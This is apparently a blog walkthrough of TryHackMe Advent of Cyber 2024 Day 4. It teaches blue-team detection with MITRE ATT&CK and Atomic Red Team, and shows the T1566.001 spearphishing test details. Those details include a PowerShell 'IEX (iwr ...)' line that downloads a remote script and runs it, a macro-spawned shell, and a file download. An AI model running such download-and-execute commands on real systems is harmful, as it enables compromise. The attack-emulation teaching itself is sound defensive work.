---
title: "TryHackMe: Advent Of Cyber 2024 Day 4"
categories: [TryHackMe]
tags: [mitre, advent of cyber]
render_with_liquid: false
img_path: /images/tryhackme_aoc2024_day4/
image:
  path: banner.png
---

SOC-mas is approaching! And the town of Warewille started preparations for the grand event.

Glitch, a quiet, talented security SOC-mas engineer, had a hunch that these year's celebrations would be different. With looming threats, he decided to revamp the town's security defences. Glitch began to fortify the town's security defences quietly and meticulously. He started by implementing a protective firewall, patching vulnerabilities, and accessing endpoints to patch for security vulnerabilities. As he worked tirelessly, he left "breadcrumbs," small traces of his activity.

Unaware of Glitch's good intentions, the SOC team spotted anomalies: Logs showing admin access, escalation of privileges, patched systems behaving differently, and security tools triggering alerts. The SOC team misinterpreted the system modifications as a sign of an insider threat or rogue attacker and decided to launch an investigation using the Atomic Red Team framework.

![Tryhackme Room Link](bell.png){: width="1152" height="300" .shadow }
_<https://tryhackme.com/r/room/adventofcyber2024>_

![](house.gif){: width="1140" height="800"}

## Learning Objectives

- Learn how to identify malicious techniques using the MITRE ATT&CK framework.
- Learn about how to use Atomic Red Team tests to conduct attack simulations.
- Understand how to create alerting and detection rules from the attack tests.

## Detection Gaps

While it might be the utopian dream of every blue teamer, we will rarely be able to detect every attack or step in an attack kill chain. This is a reality that all blue teamers face: there are gaps in their detection. But worry not! These gaps do not have to be the size of black holes; there are things we can do to help make these gaps smaller.

Detection gaps are usually for one of two main reasons:

- **Security is a cat-and-mouse game**. As we detect more, the threat actors and red teamers will find new sneaky ways to thwart our detection. We then need to study these novel techniques and update our signature and alert rules to detect these new techniques.
- **The line between anomalous and expected behaviour is often very fine and sometimes even has significant overlap**. For example, let's say we are a company based in the US. We expect to see almost all of our logins come from IP addresses in the US. One day, we get a login event from an IP in the EU, which would be an anomaly. However, it could also be our CEO travelling for business. This is an example where normal and malicious behaviour intertwine, making it hard to create accurate detection rules that would not have too much noise.
Blue teams constantly refine and improve their detection rules to close the gaps they experience due to the two reasons mentioned above. Let's take a look at how this can be done!

## Cyber Attacks and the Kill Chain

Before diving into creating new detection rules, we first have to discuss some key topics. The first topic to discuss is the Cyber Kill chain. All cyber attacks follow a fairly standard process, which is explained quite well by the Unified Cyber Kill chain:

![](chain.png){: width="920" height="410"}

As a blue teamer, it would be our dream to prevent all attacks at the start of the kill chain. So even just when threat actors start their reconnaissance, we already stop them dead in their tracks. But, as discussed before, this is not possible. The goal then shifts slightly. If we are unable to fully detect and prevent a threat actor at any one phase in the kill chain, the goal becomes to perform detections across the entire kill chain in such a way that even if there are detection gaps in a single phase, the gap is covered in a later phase. The goal is, therefore, to ensure we can detect the threat actor before the very last phase of goal execution.

## MITRE ATT&CK

A popular framework for understanding the different techniques and tactics that threat actors perform through the kill chain is the [MITRE ATT&CK Framework](https://attack.mitre.org). The framework is a collection of tactics, techniques, and procedures that have been seen to be implemented by real threat actors. The framework provides a [navigator tool](https://mitre-attack.github.io/attack-navigator/) where these TTPs can be investigated:

![](mitre.png){: width="1271" height="838"}

However, the framework primarily discusses these TTPs in a theoretical manner. Even if we know we have a gap for a specific TTP, we don't really know how to test the gap or close it down. This is where the Atomics come in!

## Atomic Red
The Atomic Red Team library is a collection of red team test cases that are mapped to the MITRE ATT&CK framework. The library consists of simple test cases that can be executed by any blue team to test for detection gaps and help close them down. The library also supports automation, where the techniques can be automatically executed. However, it is also possible to execute them manually.

## Dropping the Atomic
McSkidy has a vague idea of what happened to the "compromised machine." It seems someone tried to use the Atomic Red Team to emulate an attack on one of our systems without permission. The perpetrator also did not clean up the test artefacts. Let's have a look at what happened.

## Running an Atomic
McSkidy suspects that the supposed attacker used the MITRE ATT&CK technique [T1566.001 Spearphishing](https://attack.mitre.org/techniques/T1566/001/) with an attachment. Let's recreate the attack emulation performed by the supposed attacker and then look for the artefacts created.

Open up a PowerShell prompt as administrator and follow along with us. Let's start by having a quick peek at the help page. Enter the command Get-Help Invoke-Atomictest. You should see the output below:

```powershell
PS C:\Users\Administrator> Get-Help Invoke-Atomictest
NAME
    Invoke-AtomicTest

SYNTAX
    Invoke-AtomicTest [-AtomicTechnique] <string[]> [-ShowDetails] [-ShowDetailsBrief] [-TestNumbers <string[]>] 
    [-TestNames <string[]>] [-TestGuids <string[]>] [-PathToAtomicsFolder <string>] [-CheckPrereqs]
    [-PromptForInputArgs] [-GetPrereqs] [-Cleanup] [-NoExecutionLog] [-ExecutionLogPath <string>] [-Force] [-InputArgs<hashtable>] [-TimeoutSeconds <int>] [-Session <PSSession[]>] [-Interactive] [-KeepStdOutStdErrFiles]
    [-LoggingModule <string>] [-WhatIf] [-Confirm]  [<CommonParameters>]

ALIASES
    None

REMARKS
    None
```
The help above only shows what parameters are available without any explanation. Even though most parameter names are self-explanatory, let us have a quick overview of the parameters we will use in this walkthrough:

| Parameter           | Explanation                                                       | Example Use                                            |
|---------------------|-------------------------------------------------------------------|--------------------------------------------------------|
| **-AtomicTechnique** | Defines the technique to emulate. You can use the complete technique name or "TXXXX" value. This flag can be omitted. | `Invoke-AtomicTest -AtomicTechnique T1566.001`         |
| **-ShowDetails**     | Shows the details of each test included in the Atomic technique.  | `Invoke-AtomicTest T1566.001 -ShowDetails`             |
| **-ShowDetailsBrief**| Shows the title of each test included in the Atomic technique.    | `Invoke-AtomicTest T1566.001 -ShowDetailsBrief`        |
| **-CheckPrereqs**    | Provides a check if all necessary components are present for testing. | `Invoke-AtomicTest T1566.001 -CheckPrereqs`            |
| **-TestNames**       | Sets the tests to execute using the complete Atomic Test Name.    | `Invoke-AtomicTest T1566.001 -TestNames "Download Macro-Enabled Phishing Attachment"` |
| **-TestGuids**       | Sets the tests to execute using the unique test identifier.       | `Invoke-AtomicTest T1566.001 -TestGuids 114ccff9-ae6d-4547-9ead-4cd69f687306` |
| **-TestNumbers**     | Sets the tests to execute using the test number. The scope is limited to the Atomic Technique. | `Invoke-AtomicTest T1566.001 -TestNumbers 2,3`        |
| **-Cleanup**         | Run the cleanup commands that were configured to revert your machine state to normal. | `Invoke-AtomicTest T1566.001 -TestNumbers 2 -Cleanup`  |


**Our First Command**
We can build our first command now that we know which parameters are available. We would like to know more about what exactly happens when we test the Technique T1566.001. To get this information, we must include the name of the technique we want information about and then add the flag **-ShowDetails** to our command. Let's have a look at the command we constructed: **Invoke-AtomicTest T1566.001 -ShowDetails**. This command displays the details of all tests included in the T1566.001 Atomic.

```powershell
PS C:\Users\Administrator> Invoke-AtomicTest T1566.001 -ShowDetails
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Phishing: Spearphishing Attachment T1566.001
Atomic Test Name: Download Macro-Enabled Phishing Attachment
Atomic Test Number: 1
Atomic Test GUID: 114ccff9-ae6d-4547-9ead-4cd69f687306
Description: This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating
an end user clicking a phishing link to download the file. The file "PhishingAttachment.xlsm" is downloaded to the %temp
% directory.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$url = 'http://localhost/PhishingAttachment.xlsm'
Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm

Cleanup Commands:
Command:
Remove-Item $env:TEMP\PhishingAttachment.xlsm -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Phishing: Spearphishing Attachment T1566.001
Atomic Test Name: Word spawned a command shell and used an IP address in the command line
Atomic Test Number: 2
Atomic Test GUID: cbb6799a-425c-4f83-9194-5447a909d67f
Description: Word spawning a command prompt then running a command with an IP address in the command line is an indiciat
or of malicious activity. Upon execution, CMD will be lauchned and ping 8.8.8.8

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
Command (with inputs):
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"

Cleanup Commands:
Command:
Remove-Item #{jse_path} -ErrorAction Ignore
Command (with inputs):
Remove-Item C:\Users\Public\art.jse -ErrorAction Ignore

Dependencies:
Description: Microsoft Word must be installed
Check Prereq Command:
try {
  New-Object -COMObject "#{ms_product}.Application" | Out-Null
  $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
Check Prereq Command (with inputs):
try {
  New-Object -COMObject "Word.Application" | Out-Null
  $process = "Word"; if ( $process -eq "Word") {$process = "winword"}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
Get Prereq Command:
Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
Get Prereq Command (with inputs):
Write-Host "You will need to install Microsoft Word manually to meet this requirement"
[!!!!!!!!END TEST!!!!!!!]
```

